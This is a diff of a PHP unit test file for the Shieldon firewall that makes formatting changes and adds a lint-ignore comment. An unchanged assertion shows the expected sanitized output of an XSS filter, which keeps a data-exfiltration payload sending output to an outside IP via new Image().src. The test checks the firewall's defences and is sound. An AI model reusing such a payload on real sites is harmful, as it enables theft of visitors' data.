@@ -81,6 +81,7 @@ class FirewallTest extends \Shieldon\FirewallTest\ShieldonTestCase
 
         $this->assertEquals($_POST['test_one'], '[removed] alert&#40;&#41;; [removed]');
         $this->assertEquals($_COOKIE['test_two'], '[removed]');
+        // phpcs:ignore
         $this->assertEquals($_GET['test_three'], '[removed]new Image().src="http://19.89.6.4/test.php?output="+[removed];[removed]');
      
         // Test Xss-Protection signle variable.
@@ -138,7 +139,6 @@ class FirewallTest extends \Shieldon\FirewallTest\ShieldonTestCase
         $firewall->setConfig('captcha_modules.image.config.type', 'numeric');
         $firewall->setup();
         $firewall->run();
-    
     }
 
     public function testIpSourceOption()
@@ -325,8 +325,8 @@ class FirewallTest extends \Shieldon\FirewallTest\ShieldonTestCase
 
     public function testCaptchaResponse()
     {
-       // $this->mockSession();
-       $this->getWritableTestFilePath('_file_driver_initialized.txt', 'shieldon');
+        // $this->mockSession();
+        $this->getWritableTestFilePath('_file_driver_initialized.txt', 'shieldon');
 
         $this->testFromJsonConfig();
 
